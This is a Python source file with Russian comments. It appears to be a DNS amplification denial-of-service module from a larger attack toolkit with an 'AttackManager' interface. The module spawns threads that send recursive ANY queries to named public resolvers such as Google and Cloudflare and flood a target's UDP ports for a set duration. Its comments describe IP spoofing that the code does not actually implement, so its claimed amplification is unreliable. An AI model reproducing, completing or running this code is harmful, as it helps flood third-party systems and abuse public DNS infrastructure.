import os
import sys
import time
import random
import socket
import threading
from core.utils import Colors
import dns.message
import dns.query

class DNSAmplifier:
    def __init__(self):
        self.stop_event = threading.Event()
        self.dns_servers = [
            "8.8.8.8",      # Google DNS
            "1.1.1.1",      # Cloudflare
            "9.9.9.9",      # Quad9
            "64.6.64.6",    # Verisign
            "208.67.222.222", # OpenDNS
            "8.26.56.26"    # Comodo
        ]
        self.domains = [
            "example.com", "google.com", "youtube.com", 
            "amazon.com", "facebook.com", "microsoft.com"
        ]
    
    def generate_query(self):
        """Генерирует DNS-запрос с рекурсией для усиления"""
        domain = random.choice(self.domains)
        query = dns.message.make_query(domain, dns.rdatatype.ANY)
        query.flags |= dns.flags.RD  # Рекурсивный запрос
        return query
    
    def send_dns_query(self, target, dns_server):
        """Отправляет DNS-запрос для амплификации"""
        try:
            # Создаем UDP сокет
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            # Формируем запрос
            query = self.generate_query()
            data = query.to_wire()
            
            # Отправляем запрос на DNS-сервер
            sock.sendto(data, (dns_server, 53))
            
            # Отправляем ответ на цель (спуфинг)
            # В реальных условиях здесь будет подделанный IP-адрес
            for _ in range(10):  # Усиление в 10 раз
                sock.sendto(data, (target, random.randint(1024, 65535)))
            
            sock.close()
        except:
            pass
    
    def start(self, target, power, duration, stop_event):
        """Запускает DNS amplification атаку"""
        self.stop_event = stop_event
        threads = power * 30
        
        print(f"{Colors.PURPLE}[+] Starting DNS Amplification: {target} (Threads: {threads}){Colors.RESET}")
        
        # Создаем пул потоков
        thread_pool = []
        for _ in range(threads):
            t = threading.Thread(target=self.attack_thread, args=(target,))
            t.daemon = True
            t.start()
            thread_pool.append(t)
        
        # Ожидаем завершения по времени или сигналу
        start_time = time.time()
        while not stop_event.is_set() and time.time() - start_time < duration:
            time.sleep(1)
        
        print(f"{Colors.GREEN}[✓] DNS Amplification stopped{Colors.RESET}")
    
    def attack_thread(self, target):
        """Поток для непрерывной отправки запросов"""
        while not self.stop_event.is_set():
            # Выбираем случайный DNS-сервер
            dns_server = random.choice(self.dns_servers)
            self.send_dns_query(target, dns_server)
            time.sleep(0.1)

# Интерфейс для AttackManager
def start(target, power, duration, stop_event):
    amplifier = DNSAmplifier()
    amplifier.start(target, power, duration, stop_event)